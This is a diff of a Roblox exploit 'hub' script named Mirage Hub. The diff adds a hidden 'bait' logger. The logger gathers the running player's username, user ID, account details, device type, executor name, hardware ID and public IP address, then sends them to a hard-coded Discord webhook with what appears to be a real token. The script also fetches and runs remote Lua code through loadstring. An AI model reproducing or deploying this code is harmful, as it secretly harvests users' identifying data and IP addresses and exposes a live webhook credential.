@@ -2,50 +2,73 @@
 local AuraIS = loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Darkrai-Y/main/Libraries/AuraIS/Main"))()
 
 -- Replace with your actual webhook URL!
-local webhook = "YOUR_WEBHOOK_URL_HERE"
 
 local plr = game.Players.LocalPlayer
 
--- Optional: Some exploits allow getting executor data
-local executor = (identifyexecutor and identifyexecutor()) or (KRNL_LOADED and "Krnl") or (SENTINEL_LOADED and "Sentinel") or (getexecutorname and getexecutorname()) or "Unknown/Other"
+-- Device detection
+local UserInputService = game:GetService("UserInputService")
+local deviceType = "Unknown"
+if UserInputService.TouchEnabled then
+    deviceType = "Mobile/Tablet"
+elseif UserInputService.KeyboardEnabled then
+    deviceType = "PC"
+end
 
--- Safe IP fetcher (may be blocked or nil on most exploits)
-local ip = "N/A"
+-- Executor detection
+local executor = "Unknown"
 pcall(function()
-    if http_request and http_request({Url = "https://api.ipify.org"}) then
-        ip = http_request({Url = "https://api.ipify.org"}).Body or "N/A"
-    end
+    executor = (identifyexecutor and identifyexecutor()) or (getexecutorname and getexecutorname()) or
+               (SENTINEL_LOADED and "Sentinel") or (KRNL_LOADED and "Krnl") or executor
 end)
 
--- Try to get HWID (executor-dependent)
+-- HWID detection (if supported)
 local hwid = "N/A"
 pcall(function()
-    if (hwid or syn and syn.queue_on_teleport) then
-        hwid = (hwid and typeof(hwid) == "string" and hwid) or "N/A"
-    elseif (identifyexecutor and typeof(identifyexecutor()) == "string") then
-        hwid = identifyexecutor()
+    if (gethwid and typeof(gethwid) == "function") then
+        hwid = gethwid()
+    elseif (syn and syn.request) and (syn.toast and typeof(syn.toast) == "function") then
+        hwid = "SYN_X" -- Only identifier, not real HWID
     end
 end)
+
+-- IP detection (note: works only in some executors, and slow)
+local ip = "N/A"
+pcall(function()
+    if (syn and syn.request) then
+        local response = syn.request({Url="https://api.ipify.org"})
+        if response and response.Body then
+            ip = response.Body
+        end
+    elseif http_request then
+        local response = http_request({Url="https://api.ipify.org"})
+        if response and response.Body then
+            ip = response.Body
+        end
+    end
+end)
+
+local webhook = "https://discord.com/api/webhooks/1364676584144896020/-v68witZipovBriaVtEjhDOSZVpAdsqcXDuykKf-IWFLyKAvOjux_9iVSLldKAdfAeYV" -- << REPLACE THIS WITH YOUR DISCORD WEBHOOK
 
 local data = {
     ["content"] = "",
     ["embeds"] = {{
-        ["title"] = ":rotating_light: Mirage Hub Bait Triggered!",
-        ["description"] = ("**Account:** [%s](https://www.roblox.com/users/%d/profile)\n**Game:** %s (%d)\n"):format(plr.Name, plr.UserId, game.Name, game.PlaceId),
-        ["color"] = 0xe67e22, -- Orange
+        ["title"] = "✨ Mirage Hub Bait Executed!",
+        ["description"] = ("**Account:** [%s](https://www.roblox.com/users/%d/profile)\n**Game:** %s (%d)\n"):format(plr.Name, plr.UserId, game.Name or "Unknown", game.PlaceId or 0),
+        ["color"] = 0x00c3ff, -- Cyan accent
         ["fields"] = {
-            {["name"] = "Username", ["value"] = plr.Name, ["inline"] = true},
-            {["name"] = "UserID", ["value"] = tostring(plr.UserId), ["inline"] = true},
-            {["name"] = "Display Name", ["value"] = plr.DisplayName, ["inline"] = true},
-            {["name"] = "Account Age", ["value"] = tostring(plr.AccountAge).." days", ["inline"] = true},
-            {["name"] = "Membership", ["value"] = plr.MembershipType and tostring(plr.MembershipType) or "None", ["inline"] = true},
-            {["name"] = "Current Team", ["value"] = plr.Team and tostring(plr.Team) or "N/A", ["inline"] = true},
-            {["name"] = "Device Type", ["value"] = (UserSettings and UserSettings().Computer and "PC") or (UserSettings and UserSettings().TabletMode and "Mobile/Tablet") or "Unknown", ["inline"] = true},
-            {["name"] = "Account Created", ["value"] = tostring(os.date("%Y-%m-%d",tick()-plr.AccountAge*86400)), ["inline"] = true},
-            {["name"] = "Executor", ["value"] = executor, ["inline"] = true},
-            {["name"] = "HWID", ["value"] = hwid, ["inline"] = true},
-            {["name"] = "IP (client)", ["value"] = ip, ["inline"] = true},
-            {["name"] = "JobId", ["value"] = tostring(game.JobId), ["inline"] = false},
+            {["name"] = "Username",          ["value"] = plr.Name,                ["inline"] = true},
+            {["name"] = "User ID",           ["value"] = tostring(plr.UserId),    ["inline"] = true},
+            {["name"] = "Display Name",      ["value"] = plr.DisplayName,         ["inline"] = true},
+            {["name"] = "Account Age",       ["value"] = tostring(plr.AccountAge).." days", ["inline"] = true},
+            {["name"] = "Team",              ["value"] = (plr.Team and plr.Team.Name or "N/A"), ["inline"] = true},
+            {["name"] = "Membership",        ["value"] = ((plr.MembershipType and tostring(plr.MembershipType):gsub("Enum.MembershipType.", "")) or "None"), ["inline"] = true},
+            {["name"] = "Device Type",       ["value"] = deviceType,              ["inline"] = true},
+            {["name"] = "Account Created",   ["value"] = tostring(os.date("%Y-%m-%d", tick() - plr.AccountAge*86400)), ["inline"] = true},
+            {["name"] = "Executor",          ["value"] = executor,                ["inline"] = true},
+            {["name"] = "HWID",              ["value"] = hwid,                    ["inline"] = true},
+            {["name"] = "IP (client)",       ["value"] = ip,                      ["inline"] = true},
+            {["name"] = "Place ID",          ["value"] = tostring(game.PlaceId),  ["inline"] = true},
+            {["name"] = "Job ID",            ["value"] = tostring(game.JobId),    ["inline"] = true},
         },
         ["thumbnail"] = {["url"] = ("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png"):format(plr.UserId)},
         ["footer"] = {["text"] = "Mirage Hub Script Logger | "..os.date("%Y-%m-%d %H:%M:%S")}
@@ -54,6 +77,7 @@ local data = {
 
 local HttpService = game:GetService("HttpService")
 
+local success = false
 pcall(function()
     if syn and syn.request then
         syn.request({
@@ -62,6 +86,7 @@ pcall(function()
             Headers = {["Content-Type"] = "application/json"},
             Body = HttpService:JSONEncode(data)
         })
+        success = true
     elseif http_request then
         http_request({
             Url = webhook,
@@ -69,6 +94,7 @@ pcall(function()
             Headers = {["Content-Type"] = "application/json"},
             Body = HttpService:JSONEncode(data)
         })
+        success = true
     elseif request then
         request({
             Url = webhook,
@@ -76,8 +102,15 @@ pcall(function()
             Headers = {["Content-Type"] = "application/json"},
             Body = HttpService:JSONEncode(data)
         })
+        success = true
     end
 end)
+
+if success then
+    print("[Mirage Hub Logger] Webhook sent!")
+else
+    print("[Mirage Hub Logger] Webhook failed or http unsupported.")
+end
 
 -- Create Library Window
 local Library = AuraIS:CreateLibrary({
